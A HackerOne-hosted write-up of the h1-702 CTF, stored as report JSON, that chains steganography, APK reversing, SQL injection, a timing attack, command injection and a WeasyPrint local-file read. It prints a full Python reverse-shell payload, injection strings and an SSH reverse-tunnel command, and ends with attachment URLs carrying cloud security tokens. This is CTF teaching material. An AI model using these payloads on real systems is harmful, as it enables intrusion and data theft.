{"id":507148,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC81MDcxNDg=","url":"https://hackerone.com/reports/507148","title":"`Cody trolled us all` h1-702 CTF write-up","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2019-03-09T14:01:50.784Z","submitted_at":"2019-03-09T14:01:50.784Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"lucio","url":"/lucio","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/007/050/bb234dcfd4639de4529b14592926e18b93ea2349_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":38489,"url":"https://hackerone.com/50m-ctf","handle":"50m-ctf","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/038/489/ff893443bc2ef278fa8f0cdb64fb2f2322c8bcb7_original./43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/038/489/ff893443bc2ef278fa8f0cdb64fb2f2322c8bcb7_original./fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"paused","default_currency":"usd","awards_miles":false,"offers_bounties":false,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"50m-ctf","twitter_handle":null,"website":"https://hackerone.com/","about":null}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2019-04-08T15:54:14.999Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":"2019-04-08T15:54:04.072Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"###Premise\n\nI use not to play CTF challenges because they usually absorb me entirely. I cannot think of anything else but \"I want that flag!\". That said, this is going to be a long story: no princess, no dragoons, only a tweet.\n\n[https://twitter.com/Hacker0x01/status/1100543680383832065](https://twitter.com/Hacker0x01/status/1100543680383832065)\n\n###Level 0 - Nothing to be worried about\n\nIt's everyday use to share images on Twitter, but those are more than pictures. Quite easy to understand that, to find the next level (yes, the next level, because the tweet itself is the first one) we have to play with one or both. Steganography might be annoying sometimes, but it's something we can handle. Indeed, `zsteg` is a useful utility that automatically checks for hidden text inside a picture using different methods. All we have to do is:\n\n```shell\nzsteg image.png -a\n```\n\nAfter a few seconds, something caught my attention. Among other strings, a link came up:\n\n{F437580}\n\nFollowing the link and downloading the APK file we can finally say that our long journey is about to start.\n\n###My daily ratio of Java\n\nReverse engineering is a simple task when we're talking about **Java**. The bytecode can be decompiled, and a bad guy can go through each LOC looking for bugs and developer's leftovers. **Jadx** is the only utility we need for this step. Once opened, I immediately noticed that I was going to deal - apparently - with a client/server app, so I decided to run it on the emulator that comes along with the **Android SDK**. Moreover, some of the methods were not decompiled. Long short story, the app was supposed to be a remote thermostat controller. The first thing to do to control the temperature is to authenticate using username and password. \n\n{F438184}\n\nWondering what the username and password are?\n\n**admin** : **password**\n\nWe're in!\n\n{F438185}\n\nUnder the hood, the traffic between the client and the server is encrypted. Let's check the functions that encrypt and decrypt messages.\n\n{F437581}\n\nEasy as pie, you can choose whether literally clone it or write a port in any other language. Since I'm a **GO** lover, I decided to craft a go script for the purpose.\n\nThere're two kinds of JSON payloads:\n\n```json\n{ username: \"admin\", password: \"password\", cmd: \"getTemp\" }\n{ username: \"admin\", password: \"password\", cmd: \"setTemp\", temp: ... }\n```\n\nThe first one is used to retrieve the current target temperature whereas the second one is used to set the desired temperature. My initial thought was that, probably, there were more commands. So, after writing a few lines of code, I started a brute force attack hoping to spot the right command. Unfortunately, nothing came up. I decided to move to a different kind of approach: an **SQLi**. Since the get and set commands were not working, it was pretty clear that I had to poke around username and password.\n\nAfter some time, it turned out that the username field was actually injectable.\n\n```json\n{ username: \"admin' UNION SELECT SLEEP(1337) ;--\", password: \"password\", cmd: \"getTemp\" }\n```\n\nThe payload held the server from responding to for a significant amount of time. It was late, my eyes were closing, and the first idea I had was to write down some lines to exfiltrate each table using a time-based attack â€” one of the worse idea I've ever had. After a rest, with a clear mind, I immediately noticed that I could get every info using a boolean based attack. Indeed, when the query was successful, the server returned a success payload whereas it returned an error when the query wasn't.\n\n[Here](https://gist.github.com/luc10/975115083e3d003dfa3d5aeef26ea76f) you can find the tool I wrote to exfiltrate data.\n\nThe database contains two tables: `devices` and `users`. The first one immediately took my attention. Maybe there's more in that table that can help me to reach the target, I thought. The table has only two columns: `id` and `ip`.\n\nMy [tool](https://gist.github.com/luc10/975115083e3d003dfa3d5aeef26ea76f) took a long time to dump the whole ip column. You can see the dump [here](https://gist.github.com/luc10/06494c130c6bdc2f88b64e1500a18ee7). A long list of IPs some of which are reserved ones. Though, the first one stood out: `104.196.12.98`.\n\n###Time flies\n\nThe server at `104.196.12.98` presents us with a login panel.\n\n{F438191}\n\nFirst things first, let's check the source. Indeed, the page embeds a js file named [login.js](https://gist.github.com/luc10/a1883cc8cd485d0c213a53dfa8c36452). Basically, username and password are chained and hashed using a kind of **RC4-based** hash algorithm. I spent much time struggling with this. Directory and file discovery, brute force credentials, a flaw in the algorithm, nothing worked. I came back then looking for something else in the database and noticed that there were two other login details. Guess what? None was valid though. \n\nNot sure if your connection is worse than mine, but while playing with the hash, I noticed that the server took different time to give a response based on the length of the provided hash. More specifically, if the supplied hash was 64 chars length, the server took a few more ms to reply. Not a coincidence perhaps. \n\n```shell\ncurl 'http://104.196.12.98/' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Accept-Encoding: gzip, deflate' --data 'hash=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx' --compressed -o /dev/null -s -w '%{time_starttransfer}\\n'\n\n0.643ms\n```\n\n```shell\ncurl 'http://104.196.12.98/' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Accept-Encoding: gzip, deflate' --data 'hash=' --compressed -o /dev/null -s -w '%{time_starttransfer}\\n'\n\n0.141ms\n```\n\nAfter testing this a lot, I ended up that it wasn't a coincidence! There's something behind that checks the whole hash char by char. Back on my IDE, and faster than the light I wrote a [tool](https://gist.github.com/luc10/43fb370d8d4ac20af884644136578dd1) to brute the hash and keep track of timings. Although, but it hasn't worked anymore until I accidentally put in a byte, not a single char that would be treated as a nibble, but a whole byte. The comparison is made a single byte at a time. To ensure best results, I moved the [tool](https://gist.github.com/luc10/43fb370d8d4ac20af884644136578dd1) on a remote VPS I own. There you go with my results:\n\n{F438192}\n\nNot sure if you may imagine how long it takes, but it takes a lot. The hardest issue was in having reliable results to keep going guessing. Therefore, moving to a VPS was a good call. \n\nThe final hash is `f9865a4952a4f5d74b43f3558fed6a0225c6877fba60a250bcbde753f5db13d8`. Now we can finally log in!\n\n###There's no reason to heat up yet\n\nOnce in we're presented with a minimal menu and two options. \n\n{F438195}\n\nLet's see the page source:\n\n```html\n\u003cul\u003e\n    \u003cli\u003e\u003ca href=\"/control\"\u003eTemperature control\u003c/a\u003e\u003c/li\u003e\n    \u003cli\u003e\u003ca href=\"/update\"\u003eCheck for updates\u003c/a\u003e\u003c/li\u003e\n    \u003c!--\u003cli\u003e\u003ca href=\"/diagnostics\"\u003eDiagnostics\u003c/a\u003e\u003c/li\u003e--\u003e\n\u003c/ul\u003e\n```\n\nNice! It seems that someone just wrapped an interesting route in a comment to keep it secret. Unfortunately, the `/diagnostics` route gives us a `Forbidden` error. Need to go deeper:\n\n- `/control` allows to set the target temperature;\n- `/update`  handles the update mechanism of our thermostat.\n\nWell, we're dealing with a flask app - previously identified -. An **SSTI** it's worth a try. Unfortunately, if you provide a temperature value different than a number, the app correctly handles our input and give us an error. We can move to `/update`.\n\n```html\nFliteThermostat Check for Updates\nConnecting to http://update.flitethermostat:5000/ and downloading update manifest\n...\n...\n...\nCould not connect\n```\n\nThe second line made me think of a possible way to control the endpoint, the port or even both. Using the [param-miner](https://github.com/PortSwigger/param-miner/blob/master/resources/params) list, I dug for secret params using a disposable tool strictly written in **GO**. After a few minutes, I got a `500` from the server due to an invalid `port` passed via the - obviously - `port` **GET** param.\n\nAt first sight, I thought it was possible to control only part of the **URL**. The aim was to exploit an **SSRF**. Moreover, that's where I literally got stuck for almost two or three days until I came across this [tweet](https://twitter.com/daeken/status/1101358829168558080).\n\nA single underscore is meaningless, but what if it's a part of a second hidden param that lets me take control of the address. Slightly edited the tool and fed it with the [param-miner](https://github.com/PortSwigger/param-miner/blob/master/resources/params) list. This time I was looking for any possible get param with an underscore between two chars in its name. For instance, if we consider the word `host`, every word we can derive from it throwing in an underscore is: `h_ost`, `ho_st`, `hos_t`. Since this way didn't give me the expected result I also tried with char substitution: `_ost`, `h_st`, `ho_t`, `hos_`.\n\nNo luck! I decided to take a break and spend some time skating. In case you're wondering if I'm about to say that something that happened while skating helped me to solve this step then the answer is no!\n\nStill on the same decision that the underscore has got something to do with the CTF I ended up in manually entering words in a slice (an array for non-GO devs) and combine each element with one another using `_` as a connection. Briefly:\n\n```go\nwords := []string{\"host\", \"name\", \"update\", \"upgrade\", \"address\", \"url\", \"endpoint\"}\nfor _, left := range words {\n    for, _ right := range words {\n        checkForWeirdServerBehavior(left + '_' + right)\n    }\n}\n```\n\nBelieve me or not, but it worked. There was another secret param: `update_host`.\n\n{F438197}\n\n###Lucky number 7\n\nAs I told a few lines above, the aim was to exploit an SSRF. Few lines of code in and there we go with a port scanning. During the scan, I decided to try some payloads, and since we're speaking of a flask app, an SSTI might always be at the corner.\n\n`http://104.196.12.98/update?update_host={{ 7 * 7 }}\u0026port=1337`\n\n49 you would scream out loud. Wrong!\n\n{F438198}\n\n```html\nFliteThermostat Check for Updates\nConnecting to http://{{ 7 Dockerfile __pycache__ login.js main.py requirements.txt templates temptarget update.sh uwsgi.ini 7 }}:80/ and downloading update manifest\n...\n...\n...\nCould not connect\n```\n\nIt's a **Command Injection**, not an **SSRF** nor an **SSTI**. Quite easy from this point to spawn a reverse shell.\n\n```\nhttp://104.196.12.98/update?update_host= $(python -c %27import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"IP\",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);%27)\u0026port=1337\n```\n\n{F438200}\n\n###Where's my flag?\n\nOut of curiosity, before going further and look for the flag I had a sneak peek into `main.py`. There you go the hash check code:\n\n```python\nif request.method == 'POST':\n        h = request.form['hash']\n        if len(h) != 64:\n            error = True\n        else:\n            for i in range(0, 64, 2):\n                time.sleep(0.5)\n                if validLogin[i:i+2] != h[i:i+2]:\n                    error = True\n                    break\n        if not error:\n            session['loggedIn'] = True\n            return redirect('/main')\n```\n\nAs expected, the code sleeps for 0.5sec at every iteration and quits when the bytes don't match. That said, we can go ahead. After digging quite a lot, I figured out that the flag file wasn't in that server. There's something more to play with. I thought I had to pull the docker image, so I started playing with the GCloud token fetched using the metadata URL accessible from within the container, and it was a failure because I didn't immediately notice that the token hadn't the right permission to let me pull the image.\n\nObsessed by brute force, I edited once again the tool and looked for most known ports under the `172.20.0.1` net, and it was a good call. There was another app running behind the NAT at `172.20.0.3:80`. Someone probably messed up things, and the app was moved to `172.21.0.3:80` the day after. That's why I'm going to refer to`172.21.0.3`.\n\n###Show me your dirty secrets\n\nIn the excitement, I started `curl`-ing the app but to have a clear idea of what to do I decided to set up an SSH tunneling. Briefly, it's possible to expose the app behind the NAT using a built-in command: `ssh`. Since we can't write anything on the disk and ssh works with public keys that need to be written under the `/.ssh/` folder I had to change some settings of a web server I own to allow passwordless authentication.\n\nThe final command looks like:\n\n```shell\nssh -o PreferredAuthentications=password \\\n    -o PubkeyAuthentication=no \\\n    -o StrictHostKeyChecking=no \\\n    -fN -R *:31337:172.21.0.3:80 username@myhost\n```\n\nI could finally browse the web app using Chrome. PS: Sometimes the tunneling stopped working without a valid reason. Checking the running processes on the server, I noticed that someone else literally copied my command and tunneled the traffic to his server. Hope you got the flag too!\n\n{F438208}\n\n###Seriously?\n\nA login panel, again; a link wrapped in a comment, again. This time I had the feeling that that link would've been the right path to follow. Overthinking has always brought me far away from the actual solution of the previous steps - except for the hash challenge -. Let's give a closer look at the `/invoices/new` path and skip the auth part.\n\n{F438209}\n\nCool! It seems an HTML to PDF converter. There's even a js file that contains interesting stuff.\n\n```js\nfunction encodeInvoice() {\n   ...\n\n    var jobj = {\n        companyName: $('#recipient-company-name').val(),\n        email: $('#recipient-email').val(),\n        invoiceNumber: $('#invoice-number').val(),\n        date: $('#invoice-date').val(),\n        items: items,\n        styles: {body: {'background-color' : 'white'}}\n    };\n\n    var p = JSON.stringify(jobj);\n    return p;\n}\n\nfunction preview() {\n    // kTHJ9QYJY5597pY7uLEQCv9xEbpk41BDeRy82yzx24VggvcViiCuXqXvF11TPusmb5TucH\n    //  5MmCWZhKJD29KVGZLrB6hBbLkRPn8o6H5bF73SgHyR3BdmoVJ9hWvtHfD3NNz6rBsLqV9\n    var p = encodeInvoice();\n    var url = 'http://' + window.location.hostname + '/invoices/preview?d=' + encodeURIComponent(p);\n    url = url.replace(/[\\u00A0-\\u9999\u003c\u003e\\\u0026]/gim, function(i) { return '\u0026#'+i.charCodeAt(0)+';'; });\n    $('#iframe-box').empty();\n    $('#iframe-box').append($('\u003ciframe width=\"100%\" height=\"500px\" src=\"' + url + '\"\u003e\u003c/iframe\u003e'));\n}\n\nfunction savePDF() {\n    var p = encodeInvoice();\n    var url = 'http://' + window.location.hostname + '/invoices/pdfize?d=' + encodeURIComponent(p);\n    url = url.replace(/[\\u00A0-\\u9999\u003c\u003e\\\u0026]/gim, function(i) { return '\u0026#'+i.charCodeAt(0)+';'; });\n    var a = $('\u003ca download href=\"' + url + '\"\u003e\u003cspan\u003e\u003ci\u003eIf your download does not start, click here\u003c/i\u003e\u003c/span\u003e\u003c/a\u003e');\n    $('#iframe-box').append(a);\n    a.find('span').trigger('click');\n}\n```\n\n`kTHJ9QYJY5597pY7uLEQCv9xEbpk41BDeRy82yzx24VggvcViiCuXqXvF11TPusmb5TucH` base64 encoded stuff. Hmm... No, you're not gonna troll me again Cody!\n\nAs you might've already noticed, the server allows to define custom **CSS** rules: ` styles: {body: {'background-color' : 'white'}}`. Therefore, it suddenly made me think that probably I could embed a local file using the `background` property set to `url('file://file_to_embed')`. It would've been too easy, but there's no harm in trying. \n\nNext step was to check if there was some egress. So, I pointed the body background image through the proper CSS rule to a local web server, and I got hit. Immediately stood out the `Referrer` header: `WeasyPrint 44 (http://weasyprint.org/)`. \n\n[WeasyPrint](https://github.com/Kozea/WeasyPrint/) is an open source project, so I pulled the repo and started looking for bugs. Since my first idea was to embed a local file, but I didn't succeed, I looked for the filter that cuts out that scheme and doesn't allow to embed local files, and to my astonishment, **I realized that there wasn't.**\n\nIt didn't take so much to understand that images must be valid images or they would be discarded - yeah, nice catch Sherlock - but something in the `html.py` file caught my attention.\n\n```python\nelif element.tag == 'link' and element_has_link_type(\n                element, 'attachment'):\n            url = get_url_attribute(element, 'href', base_url)\n            title = element.get('title', None)\n            if url is None:\n                LOGGER.error('Missing href in \u003clink rel=\"attachment\"\u003e')\n            else:\n                attachments.append((url, title))\n```\n\nEasy as pie. The _only thing_ that stood between me and the LFI was a `link` tag with `rel` and `href` attributes respectively set to `attachment` and `file://file_to_embed`. The PDF converter module would've done the trick then.\n\n###Can't be a hacker if you can't pop an alert(0)\n\nThings were getting clear. The preview was there for a reason and the reason was that I had to exploit the **LFI** using a `link` tag, but in order to do that, I had to inject that `link` tag before. I started playing with every property of the `jobj` you can see above.\n\nEvery useful char that led to an **XSS** was replaced: `\u003c` became `\u0026lt;`, `\u003e` became `\u0026gt;` and so forth.\n\nIronically, the tag property that wasn't sanitized correctly was also the one I didn't play with. It took me a couple of hours to figure it out, but at late night, this:\n\n```js\njobj = {\n    ...\n    styles: {body: {'\u003cimg\u003e' : ''}}\n}\n```\n\nbecame this:\n\n{F438211}\n\n###Two is better than one\n\nOur long journey into this has not finished yet. Cody still has something in store for us. Although we can inject a custom HTML tag, we need to escape the `style` one to inject our special `\u003clink\u003e` correctly, but it's not so immediate. Indeed, the filter seems to cut out the closing style tag `\u003c/style\u003e`. A few minutes afterward I had my payload:\n\n```js\njobj = {\n    ...\n    styles: {body: {\"\u003c\u003c/style\u003e/style\u003e\u003clink rel='attachment' href='file:///etc/passwd'\u003e\u003cstyle\u003e\" : ''}}\n}\n```\n\nI usually happens when the filter removes only the first instance of the match and doesn't iterate over the input until there's not a match anymore.\n\nThe whole URL looks like:\n\n`http://myhost:31337/invoices/preview?d={\"companyName\":\"\",\"email\":\"\",\"invoiceNumber\":\"\",\"date\":\"\",\"items\":[[\"1\",\"\",\"\",\"10\"]],\"styles\":{\"body\":{\"\u003c\u003c/style\u003e/style\u003e\u003clink rel='attachment' href='file:///etc/passwd'\u003e\u003cstyle\u003e\":\"\"}}}`\n\nAs said, the filter replaces the first match but keeps the remaining string as is.\n\n{F438212}\n\n###Level-?\n\nI didn't count how many steps there were but, fortunately, this was the last one. No juggling here, instead of looking for a flag file I straightly went for the `main.py` file`\n\nThe resulting pdf usually contains compressed stuff to save space. There's a useful utility for the scope: `qpdf`.\n\n```shell\nqpdf --stream-data=uncompress pdfize.pdf uncompressed-pdfize.pdf\n```\n\nBig surprise, the flag was there!\n\n```\n\"\"\"\nCONGRATULATIONS!\n\nIf you're reading this, you've made it to the end of the road for this CTF.\n\nGo to https://hackerone.com/50m-ctf and submit your write up, including as much detail as you can.\nMake sure to include 'c8889970d9fb722066f31e804e351993' in the report, so we know for sure you made it through!\n\nCongratulations again, and I'm sorry for the red herrings. :)\n\"\"\"\n```\n\n###I feel you\n\nThough I was done, I checked the rest of [main.py](https://gist.github.com/luc10/5c0ab46fcb49aff0cf314a413a82ee7a) and I got a connection with Cody's troll part:\n\n```python\n@app.route('/auth', methods=['GET', 'POST'])\ndef auth(page=None):\n    error = None\n    if request.method == 'POST':\n        password = request.form['password']\n        error = makeSqlError(password)\n        if error is False or (\"'\" in password and 'sqlmap' in request.headers.get('User-Agent') and random.randrange(3) != 0):\n            raise Exception('SQL Error')\n    return render('login', page=page or 'login', error=error)\n\ndef makeSqlError(password):\n    password = \"'\" + password + \"'\"\n    quotes = 0\n    escape = False\n    nonquoted = ''\n    for c in password:\n        if escape:\n            escape = False\n        elif c == '\\\\':\n            escape = True\n        elif c == '\\'':\n            quotes += 1\n        elif (quotes \u0026 1) == 0:\n            nonquoted += c\n\n    if (quotes \u0026 1) != 0:\n        return False\n    elif ' OR ' in nonquoted:\n        return 'Invalid password'\n    elif 'UNION' in nonquoted:\n        return 'Invalid username'\n    return 'Invalid username or password'\n```\n\nI feel all of you guys who struggled with these fake error messages. **Definitely, it was a good call skipping the auth part.**\n\n###Final thoughts\n\nNo need to say that I learned a lot playing this even though the idea to choke someone surfaced more than once :D\n\nThanks fly out to Cody for this awesome challenge! I hope to see more from you. Not shortly though; I still need time to recover from this one.\n\n*~ Aspera perpessu fiunt iucunda relatu*\n\n## Impact\n\n- Swear and curse;\n- Sleepless nights;\n- Throw laptop out the window;\n\nIf all of the above conditions are met: **Self-Destruct**","weakness":{"id":35,"name":"Use of Hard-coded Cryptographic Key"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":437580,"file_name":"zsteg-output.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/437/580/521bca4fd0019fb5fbcd44844c77acf45b2dfca0/zsteg-output.png?response-content-disposition=attachment%3B%20filename%3D%22zsteg-output.png%22%3B%20filename%2A%3DUTF-8%27%27zsteg-output.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQSEHZZ6G7%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T150744Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCICgcJulSRaAJ%2FlV4SEWAQTyL4zo08LbSxF3YkMq%2FNlQPAiEAwYnoA1Ejs7bfAWoTffEddff%2B50LJlobfOVtd1RM%2FYnEqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDNRRuPIe4WOmezSvuirXA0I2fovKepc%2Br2vRekK4MdhNGmdM4Pc0OuzIHNmi1YNhdeljOfmMGUcQHlPqei9TxAGt4a%2Bwb9xKRrQFaS2o2gwxQkFXonxhS2p2%2FCJsWYUo5r66Rt8sQTiLMsAQcSzSjjF4bWzRQlm%2FsXkyqmfct1BfShpBMKnI%2BGx4M48yQfNnfgyRoZjVuWMHzcNqo6i%2B3imvvfu1gDhHkBQgvqL6AhnkVsXPRp6bS08enQ%2B4LeWijQjUmlhVfE3gDt1zfAq%2Fe%2FxOw17jAAuZH4zvbU5%2FFtGrJy%2BmroOTUxv%2FmxiaS8mF368AXRZQT%2FQ%2BK1TgapuP6OgN2v4j35edAg5veKR5WdWsY0QgOpQDSxzsTc2OCErw7fYWcmQYeYhOLVSghUfUtkDG76jJaJQMd36SmC4L2sb2NQ06wkAJfvd6Xh2dj7rFd%2BeVtQEdiI0FpNpkr5AYIz9emwENChfGQLyYkIfW5YUmUZn7%2BrBuWRxITz%2B3soyUxqmlqH%2B32ar8fmBp4Ie0VZd5xxkyHz5L%2BO4aTQveejpP0KxMm2%2Flqz8faN%2FLDBmpyKrFPcJn0sktEBiYdZCKd%2FJMvehZSGrjjy%2F75WSa1FwB%2FTzTTFRrGtLtYGGYby7RdTaug%2BPMKTC2jZGLBjqlAW%2FqLgyIU3l7q2BIHZ9aOYbvAcm7k5gKph8EjMf6tXptYEaiHmQx1q5jFWsRXPiWMZbi4fKKkFbfrJI1NS%2FDW3ba%2FI9tKqyLv9ZB%2FyHxyGg3CQqjMAh5HPdI6A9scOywAto0wTVOHwkl9Ay%2BNQ%2BadpR1vVj4UXnFx6R7Mt2xHMMc188gMtdSb8CXyaP6RpR3xaP3OWl7wd9lKp0P5L%2BRwYyHexzCFA%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=f10ac63311c185059396c02d3818f00ae86030160c94b650cd2a1b256c0a7e5b","file_size":339849,"type":"image/png"},{"id":437581,"file_name":"h1-apk-source.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/437/581/da40ff68ac3aa2e6df1d5c94f810c67df54c6ef2/h1-apk-source.png?response-content-disposition=attachment%3B%20filename%3D%22h1-apk-source.png%22%3B%20filename%2A%3DUTF-8%27%27h1-apk-source.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQSEHZZ6G7%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T150744Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCICgcJulSRaAJ%2FlV4SEWAQTyL4zo08LbSxF3YkMq%2FNlQPAiEAwYnoA1Ejs7bfAWoTffEddff%2B50LJlobfOVtd1RM%2FYnEqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDNRRuPIe4WOmezSvuirXA0I2fovKepc%2Br2vRekK4MdhNGmdM4Pc0OuzIHNmi1YNhdeljOfmMGUcQHlPqei9TxAGt4a%2Bwb9xKRrQFaS2o2gwxQkFXonxhS2p2%2FCJsWYUo5r66Rt8sQTiLMsAQcSzSjjF4bWzRQlm%2FsXkyqmfct1BfShpBMKnI%2BGx4M48yQfNnfgyRoZjVuWMHzcNqo6i%2B3imvvfu1gDhHkBQgvqL6AhnkVsXPRp6bS08enQ%2B4LeWijQjUmlhVfE3gDt1zfAq%2Fe%2FxOw17jAAuZH4zvbU5%2FFtGrJy%2BmroOTUxv%2FmxiaS8mF368AXRZQT%2FQ%2BK1TgapuP6OgN2v4j35edAg5veKR5WdWsY0QgOpQDSxzsTc2OCErw7fYWcmQYeYhOLVSghUfUtkDG76jJaJQMd36SmC4L2sb2NQ06wkAJfvd6Xh2dj7rFd%2BeVtQEdiI0FpNpkr5AYIz9emwENChfGQLyYkIfW5YUmUZn7%2BrBuWRxITz%2B3soyUxqmlqH%2B32ar8fmBp4Ie0VZd5xxkyHz5L%2BO4aTQveejpP0KxMm2%2Flqz8faN%2FLDBmpyKrFPcJn0sktEBiYdZCKd%2FJMvehZSGrjjy%2F75WSa1FwB%2FTzTTFRrGtLtYGGYby7RdTaug%2BPMKTC2jZGLBjqlAW%2FqLgyIU3l7q2BIHZ9aOYbvAcm7k5gKph8EjMf6tXptYEaiHmQx1q5jFWsRXPiWMZbi4fKKkFbfrJI1NS%2FDW3ba%2FI9tKqyLv9ZB%2FyHxyGg3CQqjMAh5HPdI6A9scOywAto0wTVOHwkl9Ay%2BNQ%2BadpR1vVj4UXnFx6R7Mt2xHMMc188gMtdSb8CXyaP6RpR3xaP3OWl7wd9lKp0P5L%2BRwYyHexzCFA%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=83cc98376aee7b09186fab8f6bba87d4b091234ee8c494090d2d740afed930a6","file_size":689051,"type":"image/png"},{"id":438184,"file_name":"h1-thermostat-app-login.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/438/184/15fa6a716bafa501de5ef15009a3f9390d96cbe8/h1-thermostat-app-login.png?response-content-disposition=attachment%3B%20filename%3D%22h1-thermostat-app-login.png%22%3B%20filename%2A%3DUTF-8%27%27h1-thermostat-app-login.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQSEHZZ6G7%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T150744Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCICgcJulSRaAJ%2FlV4SEWAQTyL4zo08LbSxF3YkMq%2FNlQPAiEAwYnoA1Ejs7bfAWoTffEddff%2B50LJlobfOVtd1RM%2FYnEqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDNRRuPIe4WOmezSvuirXA0I2fovKepc%2Br2vRekK4MdhNGmdM4Pc0OuzIHNmi1YNhdeljOfmMGUcQHlPqei9TxAGt4a%2Bwb9xKRrQFaS2o2gwxQkFXonxhS2p2%2FCJsWYUo5r66Rt8sQTiLMsAQcSzSjjF4bWzRQlm%2FsXkyqmfct1BfShpBMKnI%2BGx4M48yQfNnfgyRoZjVuWMHzcNqo6i%2B3imvvfu1gDhHkBQgvqL6AhnkVsXPRp6bS08enQ%2B4LeWijQjUmlhVfE3gDt1zfAq%2Fe%2FxOw17jAAuZH4zvbU5%2FFtGrJy%2BmroOTUxv%2FmxiaS8mF368AXRZQT%2FQ%2BK1TgapuP6OgN2v4j35edAg5veKR5WdWsY0QgOpQDSxzsTc2OCErw7fYWcmQYeYhOLVSghUfUtkDG76jJaJQMd36SmC4L2sb2NQ06wkAJfvd6Xh2dj7rFd%2BeVtQEdiI0FpNpkr5AYIz9emwENChfGQLyYkIfW5YUmUZn7%2BrBuWRxITz%2B3soyUxqmlqH%2B32ar8fmBp4Ie0VZd5xxkyHz5L%2BO4aTQveejpP0KxMm2%2Flqz8faN%2FLDBmpyKrFPcJn0sktEBiYdZCKd%2FJMvehZSGrjjy%2F75WSa1FwB%2FTzTTFRrGtLtYGGYby7RdTaug%2BPMKTC2jZGLBjqlAW%2FqLgyIU3l7q2BIHZ9aOYbvAcm7k5gKph8EjMf6tXptYEaiHmQx1q5jFWsRXPiWMZbi4fKKkFbfrJI1NS%2FDW3ba%2FI9tKqyLv9ZB%2FyHxyGg3CQqjMAh5HPdI6A9scOywAto0wTVOHwkl9Ay%2BNQ%2BadpR1vVj4UXnFx6R7Mt2xHMMc188gMtdSb8CXyaP6RpR3xaP3OWl7wd9lKp0P5L%2BRwYyHexzCFA%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=4f5f6eeee23b52d3f301b130420094f910287766fe00d937827307d0d8525da7","file_size":13294,"type":"image/png"},{"id":438185,"file_name":"h1-thermostat-app-temp-control.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/438/185/80306ef1efbe5dbfd655dc14b03c9d6b8c1aec44/h1-thermostat-app-temp-control.png?response-content-disposition=attachment%3B%20filename%3D%22h1-thermostat-app-temp-control.png%22%3B%20filename%2A%3DUTF-8%27%27h1-thermostat-app-temp-control.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQSEHZZ6G7%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T150744Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCICgcJulSRaAJ%2FlV4SEWAQTyL4zo08LbSxF3YkMq%2FNlQPAiEAwYnoA1Ejs7bfAWoTffEddff%2B50LJlobfO